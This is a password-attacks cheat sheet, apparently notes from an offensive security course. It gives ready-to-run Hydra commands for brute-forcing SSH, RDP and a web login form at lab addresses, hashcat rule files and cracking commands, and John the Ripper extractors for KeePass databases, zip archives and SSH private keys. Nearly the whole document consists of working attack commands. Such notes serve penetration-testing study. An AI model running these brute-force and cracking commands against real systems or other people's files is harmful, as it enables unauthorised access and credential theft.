# Password Attacks Cheatsheet

Most common wordlists:

* `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt`
* `/usr/share/wordlists/fasttrack.txt`

### Hydra

SSH Bruteforce

```bash
hydra -l george -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -s 2222
ssh://192.168.50.201
```

```bash
sudo hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://192.168.50.201
```
RDP Bruteforce

```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

HTTP Login Form Bruteforce

```bash
hydra -l user -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

### Hash Cracking

Common rules 

**Rules can be found in `/usr/share/hashcat/rules/`**

```bash
kali@kali:~/passwordattacks$ cat demo1.rule
$1 c
$1
c
```

```bash
kali@kali:~/passwordattacks$ cat demo1.rule
$1 c $!
$1 c
$1 $!
c $!
$!
c
$1
```

```bash
kali@kali:~/passwordattacks$ cat demo3.rule
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

Crack hashes with rules

```bash
hashcat -m 0 crackme.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r demo3.rule --force
```

JohnTheRipper Hash Extractors

* *Keepass*
  ```bash
  keepass2john Database.kdbx > keepass.hash
  ```
* *Zip archive*
  ```bash
  zip2john archive.zip > archive.hash
  ```
* *SSH Key*
  ```bash
  ssh2john id_rsa > key.hash
  ```
   
KeePass Database Hash Crack

```bash
hashcat -m 13400 keepass.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

SSH Private Key Hash Crack

```bash
hashcat -m 22921 ssh.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Add rules to JohnTheRipper**

```bash
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >>
/etc/john/john.conf'
```